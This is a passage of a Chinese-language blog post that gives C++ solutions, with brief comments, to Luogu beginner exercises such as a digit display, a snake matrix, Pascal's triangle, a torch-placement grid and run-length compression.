class="number">2</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">a[<span class="number">1</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">2</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">a[<span class="number">0</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">2</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">a[<span class="number">1</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">2</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">a[<span class="number">0</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">2</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">a[<span class="number">1</span>][col] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">2</span>][col] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col] = <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">a[<span class="number">1</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">2</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">a[<span class="number">0</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">2</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">a[<span class="number">1</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">a[<span class="number">0</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">2</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">a[<span class="number">1</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col] = <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">a[<span class="number">0</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">2</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">col += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n * <span class="number">4</span> - <span class="number">1</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a[i][j] == <span class="number">0</span>)</span><br><span class="line">a[i][j] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">cout &lt;&lt; a[i][j];</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是看了一下题解<a href="https://www.luogu.com.cn/article/npw7viov">题解 P5730 【【深基5.例10】显示屏】 - 洛谷专栏 (luogu.com.cn)</a>，感觉这种方法是最优解，能够拥有最快的打表速度。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">string ans[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">if</span>(a[i]==<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">ans[<span class="number">1</span>]+=<span class="string">&quot;..X.&quot;</span>;</span><br><span class="line">ans[<span class="number">2</span>]+=<span class="string">&quot;..X.&quot;</span>;</span><br><span class="line">ans[<span class="number">3</span>]+=<span class="string">&quot;..X.&quot;</span>;</span><br><span class="line">ans[<span class="number">4</span>]+=<span class="string">&quot;..X.&quot;</span>;</span><br><span class="line">ans[<span class="number">5</span>]+=<span class="string">&quot;..X.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//最后输出也是把最后的.截取掉</span></span><br></pre></td></tr></table></figure><h3 id="P5731-【深基5-习6】蛇形方阵"><a href="#P5731-【深基5-习6】蛇形方阵" class="headerlink" title="P5731 【深基5.习6】蛇形方阵"></a>P5731 【深基5.习6】蛇形方阵</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514194147792.png" alt="image-20240514194147792"></p><p>把最后一次填空交给下一循环</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">15</span>;</span><br><span class="line"><span class="type">int</span> arr[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="type">int</span> x = <span class="number">1</span>, y = <span class="number">0</span>, z = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (z &lt;= n * n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (y &lt; n &amp;&amp; !arr[x][y<span class="number">+1</span>]) &#123;</span><br><span class="line">y++;</span><br><span class="line">arr[x][y] = z;</span><br><span class="line">z++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (x &lt; n &amp;&amp; !arr[x<span class="number">+1</span>][y]) &#123;</span><br><span class="line">x++;</span><br><span class="line">arr[x][y] = z;</span><br><span class="line">z++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (y &gt;<span class="number">1</span>  &amp;&amp; !arr[x][y<span class="number">-1</span>]) &#123;</span><br><span class="line">y--;</span><br><span class="line">arr[x][y] = z;</span><br><span class="line">z++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (x &gt; <span class="number">1</span> &amp;&amp; !arr[x<span class="number">-1</span>][y]) &#123;</span><br><span class="line">x--;</span><br><span class="line">arr[x][y] = z;</span><br><span class="line">z++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) <span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>, arr[i][j]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P2141-NOIP2014-普及组-珠心算测验"><a href="#P2141-NOIP2014-普及组-珠心算测验" class="headerlink" title="P2141 [NOIP2014 普及组] 珠心算测验"></a>P2141 [NOIP2014 普及组] 珠心算测验</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514203336359.png" alt="image-20240514203336359"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">20005</span>;</span><br><span class="line"><span class="type">bool</span> a[N];</span><br><span class="line"><span class="type">int</span> b[<span class="number">105</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; b[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">&#123;</span><br><span class="line">a[b[i] + b[j]] = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a[b[i]] == <span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; count &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1161-开灯"><a href="#P1161-开灯" class="headerlink" title="P1161 开灯"></a>P1161 开灯</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514194446149.png" alt="image-20240514194446149"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="type">double</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (n--)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= b; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans ^= (<span class="type">int</span>)<span class="built_in">floor</span>(a * i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P5732-【深基5-习7】杨辉三角"><a href="#P5732-【深基5-习7】杨辉三角" class="headerlink" title="P5732 【深基5.习7】杨辉三角"></a>P5732 【深基5.习7】杨辉三角</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514202236754.png" alt="image-20240514202236754"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">25</span>;</span><br><span class="line"><span class="type">int</span> arr[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line">arr[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"> arr[i][i] =  <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">&#123;</span><br><span class="line">arr[i][j] = arr[i - <span class="number">1</span> ][j] + arr[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; arr[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1789-【Mc生存】插火把"><a href="#P1789-【Mc生存】插火把" class="headerlink" title="P1789 【Mc生存】插火把"></a>P1789 【Mc生存】插火把</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514202052617.png" alt="image-20240514202052617"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> arr[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> Count = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  cin &gt;&gt; num;</span><br><span class="line">  <span class="type">int</span> a, b;</span><br><span class="line">  cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">  <span class="keyword">while</span> (a--) &#123;</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">    arr[x][y] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">-1</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">-1</span>; j &lt; <span class="number">2</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (x + i &gt;= <span class="number">0</span> &amp;&amp; y + j &gt;= <span class="number">0</span>)</span><br><span class="line">          arr[x + i][y + j] = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    arr[x + <span class="number">2</span>][y] = <span class="number">1</span>;</span><br><span class="line">    arr[x][y + <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x - <span class="number">2</span> &gt;= <span class="number">0</span>)</span><br><span class="line">      arr[x - <span class="number">2</span>][y] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (y - <span class="number">2</span> &gt;= <span class="number">0</span>)</span><br><span class="line">      arr[x][y - <span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (b--) &#123;</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">-2</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">-2</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (x + i &gt;= <span class="number">0</span> &amp;&amp; y + j &gt;= <span class="number">0</span>)</span><br><span class="line">          arr[x + i][y + j] = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= num; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= num; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[i][j] == <span class="number">0</span>)</span><br><span class="line">        Count++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cout &lt;&lt; Count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="压缩技术"><a href="#压缩技术" class="headerlink" title="压缩技术"></a>压缩技术</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514201704482.png" alt="image-20240514201704482"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N =<span class="number">205</span>;</span><br><span class="line"><span class="type">int</span> arr[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> num;</span><br><span class="line">cin &gt;&gt; num;</span><br><span class="line"><span class="type">int</span> sum = num * num;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> raw = <span class="number">0</span>, col = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (count &lt; sum)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a, b;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">count += a + b; </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(a--)</span><br><span class="line">&#123;</span><br><span class="line">arr[raw][col] = <span class="number">0</span>;</span><br><span class="line">col++;</span><br><span class="line"><span class="keyword">if</span> (col == num )</span><br><span class="line">&#123;</span><br><span class="line">col = <span class="number">0</span>;</span><br><span class="line">raw++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(b--)</span><br><span class="line">&#123;</span><br><span class="line">arr[raw][col] = <span class="number">1</span>;</span><br><span class="line">col++;</span><br><span class="line"><span class="keyword">if</span> (col == num)</span><br><span class="line">&#123;</span><br><span class="line">col = <span class="number">0</span>;</span><br><span class="line">raw++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; num; j++)</span><br><span class="line">cout &lt;&lt; arr[i][j] ;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="压缩技术-续集版"><a href="#压缩技术-续集版" class="headerlink" title="压缩技术[续集版]"></a>压缩技术[续集版]</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514201732185.png" alt="image-20240514201732185"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N =<span class="number">40005</span>;</span><br><span class="line"><span class="type">int</span> arr[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> total = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> tmp;</span><br><span class="line"><span class="type">char</span> flag = <span class="string">&#x27;0&#x27;</span>;<span class="comment">//注意赋值为字符而不是</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span 